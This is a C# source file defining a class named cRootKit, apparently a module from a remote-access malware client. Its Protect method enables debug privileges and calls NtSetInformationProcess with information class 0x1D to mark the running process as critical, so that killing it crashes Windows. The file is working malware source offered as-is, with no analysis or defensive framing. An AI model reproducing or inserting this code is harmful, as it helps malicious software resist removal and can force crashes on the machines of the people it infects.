using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Client.Modules
{
    internal sealed class cRootKit
    {


        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public static bool Protect()
        {
            try
            {
                Process.EnterDebugMode();
                int iIsCritical = -1;

                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref iIsCritical, sizeof(int));

                return true;
            }
            catch { return false;  }
        }
    }
}
